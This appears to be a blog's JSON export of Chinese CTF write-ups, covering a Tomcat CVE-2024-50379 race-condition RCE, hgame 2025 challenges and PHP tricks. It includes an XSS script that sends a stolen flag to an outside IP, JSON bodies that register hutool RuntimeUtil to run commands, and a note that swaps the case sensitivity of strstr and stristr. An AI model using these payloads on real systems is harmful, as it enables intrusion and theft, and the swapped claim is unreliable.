[{"title":"CVE-2024-50379-Tomcat-rce","url":"/2025/04/22/CVE-2024-50379-Tomcat-rce/","content":"CVE-2024-50379-Tomcat-rce🤔 此漏洞有个前生 CVE-2017-12615\n在 Apache Tomcat 7.0.0 - 7.0.79 范围中，如果 web.xml 文件中，readonly 被设置成 false，我们就能用 put 方法(前提是没被禁用)上传一个精心打造的 jsp 文件直接来达到上传 webshell 的目的，简单粗暴\n不是本次重点，不多述\n接下来是复现部分 ：\n环境：首先我们需要 windows 环境，只有对大小不敏感的系统才能成功 rce\n受影响的 Apache Tomcat 版本包括：\n\n11.0.0-M1 &lt;&#x3D; Apache Tomcat &lt; 11.0.2\n10.1.0-M1 &lt;&#x3D; Apache Tomcat &lt; 10.1.34\n9.0.0.M1 &lt;&#x3D; Apache Tomcat &lt; 9.0.98()\n\n复现：下载有洞的版本后，我们需要先设置其中的 web.xml，在其中添加一个参数\n\n将 readonly 指定为 false，这样才能让 defultServlet 允许上传文件到服务器\n然后直接点击 startup.bat 启动，这里可能会编码错误，因为 windows 一般使用 GBK，我们需要在 logging.properties 文件中修改一下编码方式\n\n直接双击 startup.bat 启动\n\n卡在这也没事，直接访问本地的 8080 端口，即可\n当我们尝试将一个 a.jsp 文件上传的时候，会发现 404 错误、\nTomcat 是禁止直接上传 .jsp 文件，后缀为小写的 .jsp 文件，当用户访问时，Tomcat 会交给 jspServlet 处理，而他并不处理 put 方法，导致上传失败。\n\n所以我们需要先让文件能被 put 上去，我们选择将文件改为 a.Jsp 这样处理他的就是 defaultsevrlet，文件可以顺利上传\n\n回应 201(即上传成功)，本地也能看见\n\n（这时候应该可以写个 webshell，用蚁剑直接连上（没试过\n但显然我们可以做的更多，接下来进行 rce\n这时候，如果我们的文件中有精心构造的内容，我们如何让他执行呢\n（本来我是使用 yakit 开启多个线程，一个不断 put .Jsp 文件，另一个不断 GET .jsp 文件来实现条件竞争达成 rce，但是一直不成功，这里使用佬佬的 poc 完成 rce\n工具作者的 github 地址：https://github.com/SleepingBag945/CVE-2024-50379\n\n当我们访问地址时，成功弹出了计算器\n\n工具源码分析：自己看\n主要在 main 函数中，通过开启三个线程，两个不断 put，一个 get，重复到成功\n原理解释：对于 win 来说，a.Jsp 和 a.jsp 是一个文件（这个也可以研究 windows 找源码的方法知道为什么，这里不多解释。\n我们要在 GET a.jsp 时让 JspServlet 执行这个文件，这里涉及 AbstractFileResourceSet 的 file 方法\ntry &#123;\n    // JRE 方法\n    canPath = file.getCanonicalPath();\n    &#125; catch (IOException var6) &#123;\n    &#125;\n\nif (canPath != null &amp;&amp; canPath.startsWith(this.canonicalBase)) &#123;\n    String absPath = this.normalize(file.getAbsolutePath());\n    ....\n    if (!canPath.equals(absPath)) &#123;\n        if (!canPath.equalsIgnoreCase(absPath)) &#123;\n            this.logIgnoredSymlink(this.getRoot().getContext().getName(), absPath, canPath);&#125;\n            return null;\n        &#125; else &#123;\n            return file;\n         &#125;\n //大概就这些\n\n我们发现只有当 abspath&#x3D;canpath 时才会返回文件，也就是才会执行代码\n其中 abs path 是用户输入的路径拼接处理后的本地绝对路径\n其中 can path 是 JRE 类 WinNTFileSystem JNI&#x2F;cache 处理后得到的路径（如果缓存启用就会从其中获取\n当我们 PUT 一个 a.Jsp 文件上去时，显然 abspath 和 canpath 都是 a.Jsp\n当我们 GET a.jsp 时，如果我们已经 PUT a.Jsp，那么，abspath 会是 a.jsp canpath 会是 a.Jsp(从缓存中读)，那么不通过检测，就不会返回文件而如果我们 PUT 的 a.Jsp 还没落地 那么 abspath canpath 都会是 a.jsp 这样会返回文件\n但很显然不 PUT 就不会有文件，而我们查看代码可以知道，这种检查不会只有一次而是重复好几次\norg.apache.catalina.webresources#getResource\ncacheEntry.validateResource(useClassLoaderResources);\n//在 JspServlet 后续处理的过程中，会再次抵达 AbstractFileResourceSet file 方法\n//类似的过程会重复好几次\n\n在 JspServlet 读取文件前会经过很多次的检查\n所以，我们要保证在它检查的时候，我们的 abspath canpath 要一直保持 a.jsp 而在返回文件前一刻，我们的 PUT a.Jsp 文件要刚好落地，这样才能完美执行，这里就是一个条件竞争\n","tags":["CTF-CVE"]},{"title":"Week1-hgame2025","url":"/2025/04/02/Week1-hgame2025/","content":"签到路边一条，一脚踹死\nnc 那题直接连上就能执行 linux 指令\n\nWEBweb1糖豆人，直接前端找到加分规则修改一个 10000 分\n或者直接前端找到 gift 的内容，两假一真，base64 解码得 flag\nweb2乐队，可以上传文件和改名，改名那可以路径穿越，于是构造恶意 ejs 文件覆盖原来的文件即可 rce\n执行命令 env，刷新重加载即可得到 flag\nweb3留言板，爆破密码 shallot 888888\n留言板中的留言直接写入了 html 文件，执行 html 命令可以成功，于是构造恶意留言，服务器有&#x2F;admin,&#x2F;flag 路由，&#x2F;flag 路由显示只能由 admin 访问，（想了想还是粘个代码吧\n&lt;script&gt;  // 访问 /flag 页面并获取内容  fetch(&#x27;/flag&#x27;)    .then(response =&gt; response.text())    .then(flagContent =&gt; &#123;      // 将 Flag 发送到攻击者服务器      fetch(&#x27;https://82.157.129.178:80/?flag=&#x27; + encodeURIComponent(flagContent));    &#125;);&lt;/script&gt;\n\n（应该是这个（uridecode 一下就得到 flag 了\nweb5Level 38475 角落\n有 robots.txt，可知 app.py 位置，但是发现他不可读。\n通过\nRewriteEngine On\nRewriteCond “%{HTTP_USER_AGENT}” “^L1nk&#x2F;“\nRewriteRule “^&#x2F;admin&#x2F;(.*)$” “&#x2F;$1.html?secret&#x3D;todo”\n发现用 admin 读取源码会被重指向，不能直接读\nhttps://httpd.apache.ac.cn/security/vulnerabilities_24.html\nhttps://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\n大佬发现的漏洞，用？截断，于是我们可以看到源码\n\n只 waf 了{\n无路可走 有了：条件竞争，同时读和写（具体原理没搞懂）\n用 bp 不断发送注入语句\n\nyakit 读取 read 页面\n\n得到 hgame{YOU-Find-ThE-k3y_t0-rRrac3-oUUUUt2a76ddc}\nweb4Level 25 双面人派对\n给了一个 main，不知道是啥 好像是 minio 的管理代码编译后的东东，不是很清楚\nupx 脱壳后发现其中有个 minio 的项目，找到其中的 key\n\n使用 mc 连接到另一个靶机上的 minio\n\n下载其中文件\nhints 中是源码，prodbucket 中是一个 update,跟 main 好像是一样的\n查看源码，是一个 go 的项目，用了 gin,他只有一个路由，猜测是第一个靶机的源码\n我们向其中添加代码\n\n\n上传\n\nRce\n\nCRYPTOc3 sieve**结合题目给出的信息，采用两种筛法解出trick：** from sage.all import prime_pi, next_prime, inverse_modfrom Crypto.Util.number import long_to_bytesdef compute_sum_phi(k):    if k == 0:        return 0    phi = list(range(k + 1))    sum_phi = 1  # phi[1] = 1    for p in range(2, k + 1):        if phi[p] == p:  # p是素数            phi[p] = p - 1            for multiple in range(p*2, k+1, p):                phi[multiple] -= phi[multiple] // p        sum_phi += phi[p]    return sum_phie = 65537k = (e ** 2) // 6  # k = 715,870,206enc = 2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546print(&quot;计算欧拉函数前缀和...&quot;)sum_phi = compute_sum_phi(k)print(f&quot;sum_phi = &#123;sum_phi&#125;&quot;)print(&quot;计算素数个数...&quot;)pi_k = prime_pi(k)print(f&quot;pi_k = &#123;pi_k&#125;&quot;)T = sum_phi + pi_kprint(f&quot;trick(k) = &#123;T&#125;&quot;)**根据得到的值解rsa** ：from Cryptodome.Util.number import long_to_bytesfrom sympy import mod_inverse, nextprimee = 65537enc = 2449294097474714136530140099784592732766444481665278038069484466665506153967851063209402336025065476172617376546trick_result = 155763335447735055p = q = nextprime(trick_result &lt;&lt; 128)n = p * qphi_n = p  * (q - 1)d = pow(e, -1, phi_n)m_decrypted = pow(enc, d, n)decrypted_flag = long_to_bytes(m_decrypted)print(decrypted_flag)\n\n\nMiscHakuya Want A Girl Friend\n下载附件，发现是存有 hex 值的文本，有 zip 和反过来的 png，分离并生成文件，zip 有密码，png 长度被修改过，修正后发现密码，得到 flag\n\nLevel 314 线性走廊中的双生实体.pt 文件可以转为 zip，解压后看到代码，发现类中有 flag\nimport torchmodel = torch.jit.load(&#x27;entity.pt&#x27;, map_location=&#x27;cpu&#x27;)# 访问SecurityLayer实例security_layer = model.security# 提取flag列表并解码flag_numbers = security_layer.flagflag = &#x27;&#x27;.join([chr(c ^ 85) for c in flag_numbers])print(&quot;Flag:&quot;, flag)\n\n\nComputer cleaner下载发现版本不对，修改文件将 21 改为 17，成功运行，进入后 document 中有 part3，\n\n简单溯源 121.41.34.25 访问得到 flag\n\n\n","tags":["CTF-WP"]},{"title":"Week2-hgame2025","url":"/2025/04/02/Week2-hgame2025/","content":"WEBLevel 21096 HoneyPot源码给出了，发现其中的 bug，ImportData 函数未经严格过滤且直接执行 shell 命令操作\n\n发包执行命令，访问&#x2F;flag 得到 flag\nLevel 21096 HoneyPot_Revenge题目修了非预期，这里 21096 是 cve 编号，搜索并找到了出题人的 blog，根据出题人操作编译了一个恶意的 mysql，让服务器远程连上这个数据库，执行了藏在版本号里的&#x2F;writeflag 指令，访问&#x2F;flag 得到了 flag\nhttps://tech.ec3o.fun/2024/10/25/Web-Vulnerability%20Reproduction/CVE-2024-21096/\nMISCComputer cleaner plus文件隐藏了，努力找找就行\n\n","tags":["CTF-WP"]},{"title":"hgame-SigninJava","url":"/2025/04/02/hgame-SigninJava/","content":"java，打开 jar 包可以看到代码，找到一个类\n@RequestMapping(&#123;&quot;/api&quot;&#125;)@Controller_/* loaded from: SigninJava.jar:BOOT-INF/classes/icu/Liki4/signin/controller/APIGatewayController.class */_**public** **class** APIGatewayController &#123;    @RequestMapping(value = &#123;&quot;/gateway&quot;&#125;, method = &#123;RequestMethod.POST&#125;)    @ResponseBody    **public** BaseResponse doPost(HttpServletRequest request) **throws** Exception &#123;        **try** &#123;            String body = IOUtils.toString(request.getReader());            Map&lt;String, Object&gt; map = (Map) JSON.parseObject(body, Map.**class**);            String beanName = (String) map.get(&quot;beanName&quot;);            String methodName = (String) map.get(JsonEncoder.METHOD_NAME_ATTR_NAME);            Map&lt;String, Object&gt; params = (Map) map.get(&quot;params&quot;);            **if** (StrUtil.containsAnyIgnoreCase(beanName, &quot;flag&quot;)) &#123;                **return** **new** BaseResponse(403, &quot;flagTestService offline&quot;, **null**);            &#125;            Object result = InvokeUtils.invokeBeanMethod(beanName, methodName, params);            **return** **new** BaseResponse(200, **null**, result);        &#125; **catch** (Exception e) &#123;            **return** **new** BaseResponse(500, ((Throwable) Objects.requireNonNullElse(e.getCause(), e)).getMessage(), **null**);        &#125;    &#125;&#125;\n\ndopost 中接受数据，通过 InvokeUtils.invokeBeanMethod 调用指定的 Bean 方法\n查看 hutool 的文档，发现其中有一个 RuntimeUtil，其中提供了命令执行方法，但是，只有注册到 Spring 容器中的 Bean 才能被 Spring 管理，并通过依赖注入的方式使用，而 RuntimeUtil 本身并不是一个 Spring Bean，因此需要通过动态注册将其加入 Spring 容器\n因此，我们需要先调用 cn.hutool.extra.spring.SpringUtil 中的 registerBean 方法来向容器中添加 RuntimeUtil 实例名不可带有 flag\n构造请求体\n&#123;&quot;beanName&quot;:&quot;cn.hutool.extra.spring.SpringUtil&quot;,&quot;methodName&quot;:&quot;registerBean&quot;,&quot;params&quot;:&#123;&quot;arg0&quot;:&quot;execCmd&quot;,&quot;arg1&quot;:&#123;&quot;@type&quot;:&quot;cn.hutool.core.util.RuntimeUtil&quot;&#125;&#125;&#125;\n\n在调用 execCmd\n&#123;&quot;beanName&quot;:&quot;execCmd&quot;,&quot;methodName&quot;:&quot;execForStr&quot;,&quot;params&quot;:&#123;&quot;arg0&quot;:&quot;utf-8&quot;,&quot;arg1&quot;:[&quot;/readflag&quot;]&#125;&#125;\n\n这里&#x2F;flag 被加权限了，不能直接 cat\n","tags":["CTF-WP"]},{"title":"杂技！","url":"/2025/04/02/%E6%9D%82%E6%8A%80%EF%BC%81/","content":"ISCTF：千年樱：这道题令我印象深刻，主要在第三步\n\n\n参看源码我们可以得知这个程序会读取badchar这个文件，同时需要满足文件中的内容是sakura for ISCTF\n我们查看文件中的内容，此处只需让output&#x3D;114514a即可绕过，而我们看到文件内容发现与sakura for ISCTF没关系\n这里我们需要用到一个神奇小工具php_filter_chain_generator，他可以完全控制传递给 PHP 中 require 或 include 的参数，意思是我们可以直接传一个sakura for ISCTF上去   (他似乎可以直接达到rce的效果，有待考证)\n我们使用工具构建出payload，直接使用是不行的，会显示文件中没用内容，这时候把前面第一个过滤器给他删了，mark一下，不知道原因捏\n还没完，此时构建出的字符串后面会有一大坨鬼东西，好像是php的标签，我们在payload最后面加一个string.strip_tags来去除，注意要使用|链接\n此时就可以通过if了，附上开源工具的链接:Synacktiv&#x2F;php_filter_chain_generator\n攻防世界杂谈\nrobots协议\n\n页面重定向，通过网络可以监控\n\nascii十进制编码(随波逐流一把梭)\n\nburp根据payload进行爆破\n\nindex.php 后面加个s可以看到源码\n\nthinkphp各个版本的漏洞都有现成的payload，直接找\n\n\nphp反序列化\nphp执行反序列化unserialize() 会先查看有没有__wakeup方法，如果有会先执行 __wakeup方法\n\n绕过方法：在序列化的字符串中说明的对象个数要比实际的对象个数要大，那么将不会执行__wakeup这个方法\nphp文件包含(include)php:&#x2F;&#x2F;伪协议: 构造php:&#x2F;&#x2F;input再post php代码来达到rce\ndata:&#x2F;&#x2F;伪协议: 构造data:&#x2F;&#x2F;text&#x2F;plain,来达到rce\n两个函数strstr和stristr这两个函数能搜索字符串中有没有特定字符，前者不区分大小写，后者区分\n","tags":["CTF-WP"]}]